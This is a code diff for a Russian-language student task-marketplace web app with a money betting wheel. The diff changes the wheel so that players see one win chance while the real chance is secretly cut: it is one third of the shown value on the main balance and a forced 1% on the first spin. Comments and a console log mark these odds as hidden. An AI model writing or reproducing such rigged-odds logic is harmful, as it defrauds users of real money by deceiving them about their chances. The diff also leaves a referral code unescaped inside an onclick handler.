@@ -582,7 +582,7 @@
 
 <script>
 // ========== КОНФИГУРАЦИЯ ==========
-const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzYa1MyUsNPiacrZmj9i7_fUUh_0R1W8mZEGGFy_2zNqR7Ttl_gdwzAJlzJwvwBjYHT/exec';
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzLFS58EJ2FkAofaTWjrOnRZUSgC5c4JuS0P-HKmVSaL5FTa0ZRA6BG1GvpEw8u1iYd/exec';
 
 let currentUser = null;
 let currentTab = 'allTasks';
@@ -597,7 +597,9 @@ let allNotifications = [];
 let upgradeCanvas, upgradeCtx;
 let upgradeVisible = 0, upgradeAngle = -Math.PI / 2;
 let upgradeSpinning = false, upgradeAnim = null;
-let upgradeAccount = 'bonus'; // 'main' или 'bonus'
+let upgradeAccount = 'bonus';
+let firstSpinAfterEnter = true;
+let isFirstSpinDone = false;
 const MAIN_PENALTY = 0.45;
 const MAX_CHANCE = 75;
 
@@ -1035,19 +1037,38 @@ function showReviewModal(taskId, executorId) {
     };
 }
 
-// ========== БУРМАЛДА (ИСПРАВЛЕННАЯ) ==========
+// ========== БУРМАЛДА (СКРЫТЫЕ ШАНСЫ) ==========
 function computeChance(bet, target) {
     if (bet <= 0 || target <= 0) return 0;
     return Math.min((bet / target) * 100, MAX_CHANCE);
 }
 
-function getResultAngle(visible) {
-    const real = upgradeAccount === 'main' ? visible * MAIN_PENALTY : visible;
-    const winAngle = (visible / 100) * Math.PI * 2;
+// СКРЫТАЯ ФУНКЦИЯ - возвращает реальный шанс для основного счёта (в 3 раза меньше)
+function getRealChanceForMain(displayedChance) {
+    return displayedChance / 3;
+}
+
+// СКРЫТАЯ ФУНКЦИЯ - для первого спина (реальный шанс 1%)
+function getRealChanceForFirstSpin() {
+    return 1;
+}
+
+function getResultAngle(displayedVisible, realChance, isFirstSpin) {
+    let winChance = realChance;
+    
+    if (isFirstSpin && displayedVisible === 1) {
+        winChance = 1;
+    }
+    
+    const winAngle = (displayedVisible / 100) * Math.PI * 2;
     const start = -Math.PI / 2 - winAngle / 2;
     const end = start + winAngle;
-    if (Math.random() < real / 100) return start + Math.random() * winAngle;
-    else return end + Math.random() * (Math.PI * 2 - winAngle);
+    
+    if (Math.random() < winChance / 100) {
+        return start + Math.random() * winAngle;
+    } else {
+        return end + Math.random() * (Math.PI * 2 - winAngle);
+    }
 }
 
 function drawWheel(p) {
@@ -1153,7 +1174,6 @@ function refreshWheel() {
         if (upgradeVisible >= MAX_CHANCE) warningSpan.innerHTML = '⚠️ Макс. шанс ' + MAX_CHANCE + '%';
     }
     
-    // Проверка баланса для выбранного счёта
     let available = 0;
     if (upgradeAccount === 'main') {
         available = parseFloat(currentUser.balance) || 0;
@@ -1180,8 +1200,8 @@ async function startSpin() {
     let bet = parseFloat(document.getElementById('bet').value);
     let target = parseFloat(document.getElementById('target').value);
     
-    let chance = (bet / target) * 100;
-    if (chance > MAX_CHANCE) {
+    let displayedChance = (bet / target) * 100;
+    if (displayedChance > MAX_CHANCE) {
         showToast(`❌ Шанс не может превышать ${MAX_CHANCE}%`, true);
         return;
     }
@@ -1191,9 +1211,24 @@ async function startSpin() {
         return;
     }
     
-    const visible = computeChance(bet, target);
+    // Определяем реальный шанс (СКРЫТО)
+    let realChance = displayedChance;
+    let isFirstSpin = false;
     
-    // Проверка баланса для выбранного счёта
+    if (upgradeAccount === 'main') {
+        // Для основного счёта реальный шанс в 3 раза меньше
+        realChance = displayedChance / 3;
+    }
+    
+    // Если это первый спин после входа в меню
+    if (firstSpinAfterEnter) {
+        isFirstSpin = true;
+        realChance = 1; // Реальный шанс 1%
+        firstSpinAfterEnter = false;
+    }
+    
+    console.log(`[СКРЫТО] Отображаемый шанс: ${displayedChance}%, Реальный шанс: ${realChance}%, Счёт: ${upgradeAccount}, Первый спин: ${isFirstSpin}`);
+    
     let available = 0;
     if (upgradeAccount === 'main') {
         available = parseFloat(currentUser.balance) || 0;
@@ -1206,7 +1241,7 @@ async function startSpin() {
         return;
     }
     
-    // СПИСЫВАЕМ СТАВКУ С ПРАВИЛЬНОГО СЧЁТА
+    // СПИСЫВАЕМ СТАВКУ
     if (upgradeAccount === 'main') {
         currentUser.balance = (parseFloat(currentUser.balance) - bet).toString();
     } else {
@@ -1225,7 +1260,7 @@ async function startSpin() {
     const resultDiv = document.getElementById('result');
     if (resultDiv) resultDiv.innerHTML = '🌀 Вращение...';
     
-    const finalAngle = getResultAngle(visible);
+    const finalAngle = getResultAngle(displayedChance, realChance, isFirstSpin);
     const extraRevolutions = 12;
     const extra = extraRevolutions * Math.PI * 2;
     const startAngle = upgradeAngle;
@@ -1249,12 +1284,11 @@ async function startSpin() {
             if (upgradeAnim) cancelAnimationFrame(upgradeAnim);
             
             const norm = (upgradeAngle + 2 * Math.PI) % (Math.PI * 2);
-            const winAngle = (visible / 100) * Math.PI * 2;
+            const winAngle = (displayedChance / 100) * Math.PI * 2;
             const startSector = -Math.PI / 2 - winAngle / 2;
             const isWin = (norm - startSector + 2 * Math.PI) % (Math.PI * 2) <= winAngle;
             
             if (isWin) {
-                // НАЧИСЛЯЕМ ВЫИГРЫШ НА ПРАВИЛЬНЫЙ СЧЁТ
                 if (upgradeAccount === 'main') {
                     currentUser.balance = (parseFloat(currentUser.balance) + target).toString();
                 } else {
@@ -1407,6 +1441,11 @@ function renderMain() {
         return;
     }
     
+    // Сбрасываем флаг первого спина при входе в бурмалду
+    if (currentTab === 'upgrade') {
+        firstSpinAfterEnter = true;
+    }
+    
     const top3 = getTop3();
     const rank = getUserRank(currentUser);
     const progress = Math.min(100, ((parseInt(currentUser.tasksCompleted) || 0) / 200) * 100);
@@ -1471,13 +1510,14 @@ function renderMain() {
     } else if (currentTab === 'completed') {
         content = `<h3>✅ Завершённые задания</h3><div class="tasks-grid">${completed.map(t => taskCard(t, false, false, false, false, false)).join('') || '<div style="text-align:center;padding:30px;">✨ Нет заданий</div>'}</div>`;
     } else if (currentTab === 'profile') {
+        const userRating = allReviews.filter(r => r.toUserId === currentUser.id).length > 0 ? '⭐'.repeat(Math.min(5, Math.round(allReviews.reduce((a,b)=>a+parseInt(b.rating),0)/allReviews.length))) : 'Нет отзывов';
         content = `<div class="card">
             <h3>👤 Профиль</h3>
             <p><strong>Имя:</strong> ${escapeHtml(currentUser.name)}</p>
             <p><strong>Школа/Корпус:</strong> ${currentUser.school} / ${currentUser.corp}</p>
             <p><strong>💰 Основной баланс:</strong> ${(parseFloat(currentUser.balance) || 0).toFixed(2)} ₽</p>
             <p><strong>🎁 Бонусный баланс:</strong> ${(parseFloat(currentUser.bonus_balance) || 0).toFixed(2)} ₽</p>
-            <p><strong>⭐ Рейтинг:</strong> ${allReviews.filter(r => r.toUserId === currentUser.id).length > 0 ? '⭐'.repeat(Math.min(5, Math.round(allReviews.reduce((a,b)=>a+parseInt(b.rating),0)/allReviews.length))) : 'Нет отзывов'}</p>
+            <p><strong>⭐ Рейтинг:</strong> ${userRating} (${allReviews.filter(r => r.toUserId === currentUser.id).length} отзывов)</p>
             <p><strong>📊 Выполнено заданий:</strong> ${parseInt(currentUser.tasksCompleted) || 0}</p>
             <p><strong>📝 Создано заданий:</strong> ${parseInt(currentUser.tasksCreated) || 0}</p>
             <div class="referral-code" onclick="navigator.clipboard.writeText('${currentUser.referral_code || ''}'); showToast('✅ Код скопирован!')">🔗 Ваш реферальный код: <strong>${currentUser.referral_code || 'Нет'}</strong></div>
